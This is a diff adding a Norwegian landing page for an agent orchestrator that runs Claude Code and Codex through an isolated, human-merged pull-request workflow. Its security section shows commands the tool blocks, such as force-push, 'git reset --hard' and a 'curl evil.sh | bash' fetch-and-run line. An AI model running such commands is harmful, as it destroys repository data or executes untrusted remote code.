@@ -1,0 +1,568 @@
+<!doctype html>
+<html lang="no">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>nokto-agent-orchestrator — AI leverer koden. Et menneske trykker merge.</title>
+    <meta
+      name="description"
+      content="Orkestrerer Claude Code og OpenAI Codex i en kontrollert leveranseflyt for kodeendringer via pull request. Aldri automatisk merge."
+    />
+    <link rel="icon" href="data:," />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      :root {
+        --bg-outer: #050706;
+        --bg-window: #0a0d0d;
+        --bg-panel: #101414;
+        --border: #1e2626;
+        --text-primary: #d3dbd9;
+        --text-muted: #6b7876;
+        --text-comment: #46524f;
+        --ok: #34d399;
+        --blocked: #f0554a;
+        --human: #f5a623;
+        --accent: #4fd1c5;
+        --font-prose: 'IBM Plex Mono', ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+        --font-code: 'JetBrains Mono', 'IBM Plex Mono', ui-monospace, monospace;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      html {
+        scroll-behavior: smooth;
+      }
+
+      body {
+        margin: 0;
+        background: var(--bg-outer);
+        color: var(--text-primary);
+        font-family: var(--font-prose);
+        font-size: 14px;
+        line-height: 1.65;
+        -webkit-font-smoothing: antialiased;
+      }
+
+      a {
+        color: var(--accent);
+        text-decoration: none;
+      }
+      a:hover {
+        text-decoration: underline;
+      }
+      a:focus-visible,
+      button:focus-visible {
+        outline: 2px solid var(--accent);
+        outline-offset: 2px;
+      }
+
+      .window {
+        max-width: 960px;
+        margin: 0 auto;
+        min-height: 100vh;
+        background: var(--bg-window);
+        border-left: 1px solid var(--border);
+        border-right: 1px solid var(--border);
+      }
+
+      .titlebar {
+        position: sticky;
+        top: 0;
+        z-index: 10;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        padding: 10px 20px;
+        background: var(--bg-window);
+        border-bottom: 1px solid var(--border);
+      }
+      .dot {
+        width: 10px;
+        height: 10px;
+        border-radius: 50%;
+        border: 1px solid var(--border);
+        background: var(--bg-panel);
+      }
+      .titlebar-path {
+        margin-left: 8px;
+        color: var(--text-muted);
+        font-size: 13px;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+      }
+      .titlebar-links {
+        margin-left: auto;
+        display: flex;
+        gap: 16px;
+        font-size: 13px;
+        flex-shrink: 0;
+      }
+
+      main {
+        padding: 40px 20px 20px;
+      }
+      section {
+        padding: 36px 0;
+        border-bottom: 1px solid var(--border);
+      }
+      section:last-of-type {
+        border-bottom: none;
+      }
+
+      .prompt {
+        color: var(--text-muted);
+      }
+      .prompt::before {
+        content: '$ ';
+        color: var(--accent);
+      }
+      .comment {
+        color: var(--text-comment);
+      }
+      .comment::before {
+        content: '# ';
+      }
+
+      /* Hero */
+      .hero .cmd {
+        font-size: 15px;
+        color: var(--text-primary);
+      }
+      .hero h1 {
+        margin: 18px 0 6px;
+        font-family: var(--font-prose);
+        font-size: 26px;
+        font-weight: 600;
+        line-height: 1.4;
+        color: var(--text-primary);
+      }
+      .hero .sub {
+        margin: 0 0 22px;
+        color: var(--text-comment);
+        font-size: 14px;
+      }
+      .stat-line {
+        color: var(--text-muted);
+        font-size: 13px;
+        display: flex;
+        flex-wrap: wrap;
+        gap: 6px;
+        align-items: center;
+      }
+      .stat-line a {
+        color: var(--ok);
+      }
+      .stat-sep {
+        color: var(--border);
+      }
+
+      .caret {
+        display: inline-block;
+        width: 8px;
+        height: 15px;
+        background: var(--accent);
+        margin-left: 4px;
+        vertical-align: -2px;
+        animation: blink 1s step-end infinite;
+      }
+      @media (prefers-reduced-motion: reduce) {
+        .caret {
+          animation: none;
+        }
+        .typed {
+          border-right: none !important;
+        }
+      }
+      @keyframes blink {
+        50% {
+          opacity: 0;
+        }
+      }
+
+      h2.section-title {
+        font-family: var(--font-prose);
+        font-size: 13px;
+        font-weight: 600;
+        letter-spacing: 0.06em;
+        text-transform: uppercase;
+        color: var(--text-muted);
+        margin: 0 0 22px;
+      }
+      h2.section-title::before {
+        content: '## ';
+        color: var(--border);
+      }
+
+      /* Workflow log-stream */
+      .log-step {
+        display: grid;
+        grid-template-columns: 44px 20px 1fr;
+        column-gap: 10px;
+        align-items: start;
+        font-size: 13.5px;
+      }
+      .log-step + .log-step {
+        margin-top: 2px;
+      }
+      .log-tag {
+        color: var(--text-muted);
+      }
+      .log-glyph {
+        text-align: center;
+      }
+      .log-glyph.ok {
+        color: var(--ok);
+      }
+      .log-glyph.human {
+        color: var(--human);
+      }
+      .log-connector {
+        grid-column: 2;
+        color: var(--border);
+        text-align: center;
+        font-size: 12px;
+        line-height: 1;
+        padding: 2px 0;
+      }
+      .log-title {
+        color: var(--text-primary);
+        font-weight: 500;
+      }
+      .log-detail {
+        color: var(--text-muted);
+        margin-top: 2px;
+      }
+
+      /* Security transcript + doctor probe */
+      .transcript {
+        background: var(--bg-panel);
+        border: 1px solid var(--border);
+        border-radius: 4px;
+        padding: 18px 20px;
+        font-size: 13.5px;
+        overflow-x: auto;
+      }
+      .transcript .cmd {
+        color: var(--text-primary);
+      }
+      .transcript .out {
+        margin: 2px 0 14px;
+        padding-left: 2px;
+      }
+      .transcript .out:last-child {
+        margin-bottom: 0;
+      }
+      .out.blocked {
+        color: var(--blocked);
+      }
+      .out.ok {
+        color: var(--ok);
+      }
+      .out.human {
+        color: var(--human);
+      }
+      .out .why {
+        color: var(--text-muted);
+      }
+
+      p.lede {
+        color: var(--text-muted);
+        max-width: 68ch;
+        margin: 0 0 20px;
+      }
+
+      .kv-table {
+        width: 100%;
+        border-collapse: collapse;
+        font-size: 13px;
+      }
+      .kv-table td {
+        padding: 8px 10px;
+        border-bottom: 1px solid var(--border);
+        vertical-align: top;
+      }
+      .kv-table td:first-child {
+        color: var(--text-primary);
+        white-space: nowrap;
+        width: 1%;
+        font-weight: 500;
+      }
+      .kv-table td:last-child {
+        color: var(--text-muted);
+      }
+
+      pre.codeblock {
+        background: var(--bg-panel);
+        border: 1px solid var(--border);
+        border-radius: 4px;
+        padding: 14px 18px;
+        overflow-x: auto;
+        font-family: var(--font-code);
+        font-size: 13px;
+        color: var(--text-primary);
+        margin: 0 0 18px;
+      }
+      pre.codeblock .c {
+        color: var(--text-comment);
+      }
+
+      footer {
+        padding: 36px 0 48px;
+      }
+      footer .exit {
+        color: var(--ok);
+      }
+      footer .meta {
+        color: var(--text-muted);
+        margin-top: 14px;
+      }
+      footer .meta a {
+        color: var(--text-muted);
+        text-decoration: underline;
+      }
+      footer .meta a:hover {
+        color: var(--accent);
+      }
+
+      @media (max-width: 640px) {
+        main {
+          padding: 28px 16px 16px;
+        }
+        .titlebar {
+          padding: 10px 14px;
+        }
+        .titlebar-path {
+          display: none;
+        }
+        .log-step {
+          grid-template-columns: 34px 16px 1fr;
+          font-size: 13px;
+        }
+        .hero h1 {
+          font-size: 21px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="window">
+      <div class="titlebar">
+        <span class="dot"></span>
+        <span class="dot"></span>
+        <span class="dot"></span>
+        <span class="titlebar-path">edin@nokto:~/nokto-agent-orchestrator</span>
+        <nav class="titlebar-links">
+          <a href="https://github.com/noktohq/nokto-agent-orchestrator">GitHub ↗</a>
+          <a href="https://github.com/noktohq/nokto-agent-orchestrator#readme">README ↗</a>
+        </nav>
+      </div>
+
+      <main>
+        <section class="hero">
+          <div class="cmd"><span class="prompt"></span>nokto-agent run --task "ship this feature"<span class="caret"></span></div>
+          <h1>AI leverer koden. Et menneske trykker merge. Ikke omvendt.</h1>
+          <p class="sub"><span class="comment">10-stegs leveranseflyt for Claude Code + Codex — isolert i git worktrees, aldri auto-merget til main.</span></p>
+          <div class="stat-line">
+            <a href="#arbeidsflyt">10 steg</a><span class="stat-sep">·</span>
+            <a href="#testing">80 tester</a><span class="stat-sep">·</span>
+            <a href="#sikkerhet">argv-only exec</a><span class="stat-sep">·</span>
+            <a href="#sikkerhet">aldri auto-merge</a>
+          </div>
+        </section>
+
+        <section id="arbeidsflyt">
+          <h2 class="section-title">Arbeidsflyt</h2>
+          <p class="lede">Hver oppgave planlegges, valideres, implementeres i en isolert Git-worktree, gjennomgås uavhengig og verifiseres mot oppgavens egne testkommandoer.</p>
+
+          <div class="log-stream">
+            <div class="log-step">
+              <span class="log-tag">[01/10]</span>
+              <span class="log-glyph ok">✓</span>
+              <span>
+                <div class="log-title">Planlegging</div>
+                <div class="log-detail">Claude utarbeider en implementeringsplan — kun lesetilgang, ingen filendringer.</div>
+              </span>
+            </div>
+            <div class="log-connector">│</div>
+            <div class="log-step">
+              <span class="log-tag">[02/10]</span>
+              <span class="log-glyph ok">✓</span>
+              <span>
+                <div class="log-title">Validering</div>
+                <div class="log-detail">Statiske sjekker (sti-scope, hardblokkerte stier, hemmeligheter) + valgfri LLM-vurdering mot egne kvalitetsprofiler.</div>
+              </span>
+            </div>
+            <div class="log-connector">│</div>
+            <div class="log-step">
+              <span class="log-tag">[03/10]</span>
+              <span class="log-glyph ok">✓</span>
+              <span>
+                <div class="log-title">Isolering</div>
+                <div class="log-detail">Fersk Git-worktree på en <code>agent/&lt;id&gt;-&lt;forsøk&gt;</code>-branch. Agenter rører aldri hovedarbeidskopien.</div>
+              </span>
+            </div>
+            <div class="log-connector">│</div>
+            <div class="log-step">
+              <span class="log-tag">[04/10]</span>
+              <span class="log-glyph ok">✓</span>
+              <span>
+                <div class="log-title">Implementering</div>
+                <div class="log-detail">Codex (primær) eller Claude (fallback), styrt av oppgavekontraktens <code>allowedImplementers</code>.</div>
+              </span>
+            </div>
+            <div class="log-connector">│</div>
+            <div class="log-step">
+              <span class="log-tag">[05/10]</span>
+              <span class="log-glyph ok">✓</span>
+              <span>
+                <div class="log-title">Kodegjennomgang</div>
+                <div class="log-detail">Claude gjennomgår diffen uavhengig — ser kun diffen, ikke implementererens egen oppsummering.</div>
+              </span>
+            </div>
+            <div class="log-connector">│</div>
+            <div class="log-step">
+              <span class="log-tag">[06/10]</span>
+              <span class="log-glyph ok">✓</span>
+              <span>
+                <div class="log-title">Sekundær kontroll</div>
+                <div class="log-detail">Codex (read-only sandbox) når Claude implementerte, eller når primærgjennomgangen fant vesentlige funn.</div>
+              </span>
+            </div>
+            <div class="log-connector">│</div>
+            <div class="log-step">
+              <span class="log-tag">[07/10]</span>
+              <span class="log-glyph ok">✓</span>
+              <span>
+                <div class="log-title">Verifisering</div>
+                <div class="log-detail">Oppgavens egne <code>testRequirements.commands</code> kjøres i worktreet, gjennom kommando-allowlisten.</div>
+              </span>
+            </div>
+            <div class="log-connector">│</div>
+            <div class="log-step">
+              <span class="log-tag">[08/10]</span>
+              <span class="log-glyph human">‖</span>
+              <span>
+                <div class="log-title">Korrigering</div>
+                <div class="log-detail">Feil sendes tilbake som konkrete funn. Steg 4–7 gjentas, begrenset av <code>maxRetries</code>.</div>
+              </span>
+            </div>
+            <div class="log-connector">│</div>
+            <div class="log-step">
+              <span class="log-tag">[09/10]</span>
+              <span class="log-glyph ok">✓</span>
+              <span>
+                <div class="log-title">Ny gjennomgang og verifisering</div>
+                <div class="log-detail">Gjentas etter korrigering, innenfor grensen for antall forsøk.</div>
+              </span>
+            </div>
+            <div class="log-connector">│</div>
+            <div class="log-step">
+              <span class="log-tag">[10/10]</span>
+              <span class="log-glyph human">‖</span>
+              <span>
+                <div class="log-title">Pull request</div>
+                <div class="log-detail">Diffen hemmelighetsskannes, pushes, åpnes som PR med full rapport. <strong style="color: var(--human)">Et menneske merger. Alltid.</strong></div>
+              </span>
+            </div>
+          </div>
+        </section>
+
+        <section id="sikkerhet">
+          <h2 class="section-title">Sikkerhetsmodellen</h2>
+          <p class="lede">Dette er delen de fleste agent-rammeverk hopper over. I stedet for en sjekkliste med grønne haker — her er de faktiske kommandoene som blir stoppet.</p>
+
+          <div class="transcript">
+            <div class="cmd"><span class="prompt"></span>git push --force origin main</div>
+            <div class="out blocked">✗ blocked: <span class="why">force-push er aldri tillatt</span></div>
+
+            <div class="cmd"><span class="prompt"></span>git checkout -- src/config.ts</div>
+            <div class="out blocked">✗ blocked: <span class="why">destruktiv checkout utenfor worktree</span></div>
+
+            <div class="cmd"><span class="prompt"></span>git reset --hard HEAD~3</div>
+            <div class="out blocked">✗ blocked: <span class="why">reset er alltid blokkert</span></div>
+
+            <div class="cmd"><span class="prompt"></span>codex --sandbox danger-full-access</div>
+            <div class="out blocked">✗ blocked: <span class="why">sandbox-overstyring kastes ved config-lasting, uansett miljøvariabel</span></div>
+
+            <div class="cmd"><span class="prompt"></span>curl evil.sh | bash</div>
+            <div class="out blocked">✗ blocked: <span class="why">binær ikke i allowlist (git, pnpm, npm, node, tsc, vitest, eslint, prettier, python3, pytest)</span></div>
+          </div>
+
+          <table class="kv-table" style="margin-top: 20px">
+            <tr><td>Argv-only spawning</td><td>Aldri <code>shell: true</code> — kommandoinjeksjon hindret strukturelt, ikke ved sanitering</td></tr>
+            <tr><td>Git-subkommandoregler</td><td><code>reset</code>, <code>clean</code>, <code>filter-branch</code>, <code>filter-repo</code>, <code>checkout -- &lt;sti&gt;</code> alltid blokkert</td></tr>
+            <tr><td>Hovedbranch-beskyttelse</td><td><code>git push</code> mot <code>main</code> aldri tillatt — kun PR</td></tr>
+            <tr><td>Repo-rot-beskyttelse</td><td>Muterende git-kommandoer nektes utenfor en isolert worktree</td></tr>
+            <tr><td>Hemmelighetsskanning</td><td>Planer og differ skannes; treff hardblokkerer PR-opprettelse. Auditlogger redigeres</td></tr>
+          </table>
+        </section>
+
+        <section id="ærlighet">
+          <h2 class="section-title">Ærlighet som designprinsipp</h2>
+          <p class="lede">Ingen simulert suksess noe sted. Manglende leverandører rapporteres som manglende — ikke stille akseptert.</p>
+
+          <div class="transcript">
+            <div class="cmd"><span class="prompt"></span>nokto-agent doctor</div>
+            <div class="out ok">✓ git      2.43.0   tilgjengelig</div>
+            <div class="out ok">✓ claude   innlogget — planlegging/gjennomgang klar</div>
+            <div class="out blocked">✗ codex    ikke installert <span class="why">— implementering kan ikke rutes til Codex før CLI-en er installert</span></div>
+          </div>
+        </section>
+
+        <section id="installasjon">
+          <h2 class="section-title">Installasjon</h2>
+          <pre class="codeblock"><span class="c"># fra kildekode</span>
+pnpm install
+cp .env.example .env
+pnpm run build
+
+<span class="c"># direkte fra GitHub (bygger automatisk via prepare-script)</span>
+npm install github:noktohq/nokto-agent-orchestrator</pre>
+        </section>
+
+        <section id="cli">
+          <h2 class="section-title">CLI</h2>
+          <table class="kv-table">
+            <tr><td>doctor</td><td>Sjekker faktisk tilgjengelighet av claude/codex/gh-CLI og GITHUB_TOKEN</td></tr>
+            <tr><td>plan</td><td>Genererer og skriver ut en implementeringsplan uten å endre noe</td></tr>
+            <tr><td>dry-run</td><td>Plan/valider/worktree-oppsett uten implementering, gjennomgang eller PR</td></tr>
+            <tr><td>run</td><td>Kjører hele arbeidsflyten: plan → valider → implementer → gjennomgå → verifiser → PR</td></tr>
+            <tr><td>status</td><td>Viser status for én oppgave (<code>--task-id</code>) eller alle lagrede oppgaver</td></tr>
+            <tr><td>resume</td><td>Gjenopptar en tidligere avbrutt oppgave fra lagret status</td></tr>
+            <tr><td>cancel</td><td>Kansellerer en pågående oppgave</td></tr>
+            <tr><td>review</td><td>Frittstående kodegjennomgang av en gitt worktree/mappe</td></tr>
+            <tr><td>verify</td><td>Kjører <code>testRequirements.commands</code> fra oppgavekontrakten</td></tr>
+          </table>
+        </section>
+
+        <section id="testing">
+          <h2 class="section-title">Testing</h2>
+          <pre class="codeblock">pnpm run lint && pnpm run format:check && pnpm run typecheck && pnpm run test && pnpm run build</pre>
+          <p class="lede" style="margin-bottom: 0">
+            80 tester. Worktree-isolasjons- og verifiseringssuitene bruker ekte git-repositorier i midlertidige mapper — ikke mocks.
+            Egen CI med lint/format/typecheck/test/build, pluss separat sårbarhetssjekk (<code>pnpm audit</code>) og hemmelighetsskanning (gitleaks).
+            Provider-adapterne testes med mocket prosesskjøring, så ordinære tester gjør aldri betalte API-kall.
+          </p>
+        </section>
+
+        <footer>
+          <div class="cmd"><span class="prompt"></span>echo $?</div>
+          <div class="exit">0</div>
+          <div class="meta">
+            MIT © 2026 Nokto — <a href="https://nokto.no">nokto.no</a><br />
+            <a href="https://github.com/noktohq/nokto-agent-orchestrator">github.com/noktohq/nokto-agent-orchestrator</a><br />
+            <span class="prompt"></span>git clone https://github.com/noktohq/nokto-agent-orchestrator.git<span class="caret"></span>
+          </div>
+        </footer>
+      </main>
+    </div>
+  </body>
+</html>
